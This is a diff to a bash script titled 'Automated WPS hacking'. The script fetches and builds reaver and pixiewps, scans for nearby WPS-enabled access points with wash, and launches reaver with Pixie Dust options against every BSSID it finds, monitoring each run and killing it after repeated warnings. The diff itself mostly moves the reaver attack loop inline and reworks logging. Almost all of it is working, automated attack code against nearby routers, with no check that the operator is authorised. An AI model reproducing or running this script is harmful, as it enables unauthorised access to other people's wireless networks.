@@ -38,47 +38,6 @@ washCmd() {
     timeout $wash_timeout wash $wash_options > $logs/wash.log 2>&1
 }
 
-reaverCmd() {
-    reaver_options="-a -f -c $channel -i mon0 -b $mac -m $(getMac) -d $reaver_delay -vv"
-
-    if [ "$(echo $line | grep Yes)" != "" ]; then
-        reaver_options=$reaver_options" -L"
-    fi
-
-    if [ "$(echo $line | grep Realtek)" == "" ]; then
-        reaver_options=$reaver_options" -S"
-    fi
-
-    if [ "$pixiewps" != "" ]; then
-        reaver_options=$reaver_options" --pixie-dust=1"
-    fi
-
-    resetInterface
-
-    e "Command: reaver $reaver_options"
-
-    echo "Start at: `date "+%Y-%m-%d %H:%M:%S"`" > "$logs/$mac.log"
-
-    reaver $reaver_options >> "$logs/$mac.log" 2>&1 &
-
-    while [ true ]; do
-        sleep 10
-
-        if [ "$(ps -ef | grep 'reaver ' | grep -v grep)" == "" ]; then
-            e "Finished" >> "$logs/$mac.log"
-            break
-        fi
-
-        if [ "$(tail -20 "$logs/$mac.log" | grep "WARNING" | wc -l)" -gt $reaver_attemps ]; then
-            e "Stopped (too many warnings)" >> "$logs/$mac.log"
-            killProcess reaver
-            break
-        fi
-    done
-
-    echo "End at: `date "+%Y-%m-%d %H:%M:%S"`" >> "$logs/$mac.log"
-}
-
 resetInterface() {
     for interface in $(ifconfig | grep -o "^mon[0-9]\+"); do
         airmon-ng stop $interface > /dev/null
@@ -114,7 +73,14 @@ here="$(pwd)"
 logs="$here/logs"
 tmp="$here/tmp"
 
-e "Automated WPS hacking"
+if [ ! -d "$logs" ]; then
+    mkdir "$logs"
+fi
+
+echo ""
+echo "Automated WPS hacking"
+echo "---------------------"
+echo ""
 
 read -p "Install reaver/wash new versions? [y/n] " install
 
@@ -125,9 +91,9 @@ if [ "$install" == "y" ]; then
         mkdir $tmp
     fi
 
-    echo ""
-
     if [ "$install" == "y" ]; then
+        echo ""
+
         wget -nv https://github.com/wiire/pixiewps/archive/master.zip -O $tmp/pixiewps.zip
         wget -nv https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip -O $tmp/reaver-wps-fork-t6x.zip
     elif [ -f pixiewps.zip ] && [ -f reaver-wps-fork-t6x.zip ]; then
@@ -136,15 +102,23 @@ if [ "$install" == "y" ]; then
         e "Local zip packages unavailable" "true"
     fi
 
-    echo ""
+    e "Installing packages. Please wait... (check log $logs/install.log)"
 
-    cd $tmp/
+    cd $tmp
 
     unzip -o -qq pixiewps.zip
     unzip -o -qq reaver-wps-fork-t6x.zip
 
-    cd $tmp/pixiewps*/src && make && make install
-    cd $tmp/reaver-wps-fork-t6x*/src && ./configure && make && make install
+    echo '' > $logs/install.log
+
+    cd $tmp/pixiewps*/src &&\
+        make >> $logs/install.log 2>&1 &&\
+        make install >> $logs/install.log 2>&1
+
+    cd $tmp/reaver-wps-fork-t6x*/src &&\
+        ./configure >> $logs/install.log 2>&1 &&\
+        make >> $logs/install.log 2>&1 &&\
+        make install >> $logs/install.log 2>&1
 
     cd $here
 fi
@@ -157,10 +131,6 @@ for command in airmon-ng wash reaver; do
 done
 
 pixiewps="$(which pixiewps 2> /dev/null)"
-
-if [ ! -d "$logs" ]; then
-    mkdir "$logs"
-fi
 
 resetInterface
 
@@ -186,7 +156,44 @@ cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | w
     echo "MAC Address: $mac"
     echo "Log: logs/$mac.log"
 
-    reaverCmd
+    reaver_options="-a -f -c $channel -i mon0 -b $mac -m $(getMac) -d $reaver_delay -vv"
+
+    if [ "$(echo $line | grep Yes)" != "" ]; then
+        reaver_options=$reaver_options" -L"
+    fi
+
+    if [ "$(echo $line | grep Realtek)" == "" ]; then
+        reaver_options=$reaver_options" -S"
+    fi
+
+    if [ "$pixiewps" != "" ]; then
+        reaver_options=$reaver_options" --pixie-dust=1"
+    fi
+
+    resetInterface
+
+    e "Command: reaver $reaver_options"
+
+    echo "Start at: $(date "+%Y-%m-%d %H:%M:%S")" > "$logs/$mac.log"
+
+    reaver $reaver_options >> "$logs/$mac.log" 2>&1 &
+
+    while [ true ]; do
+        sleep 10
+
+        if [ "$(ps -ef | grep 'reaver ' | grep -v grep)" == "" ]; then
+            e "Finished" >> "$logs/$mac.log"
+            break
+        fi
+
+        if [ "$(tail -20 "$logs/$mac.log" | grep "WARNING" | wc -l)" -gt $reaver_attemps ]; then
+            e "Stopped (too many warnings)" >> "$logs/$mac.log"
+            killProcess reaver
+            break
+        fi
+    done
+
+    echo "End at: $(date "+%Y-%m-%d %H:%M:%S")" >> "$logs/$mac.log"
 done
 
 exit 0
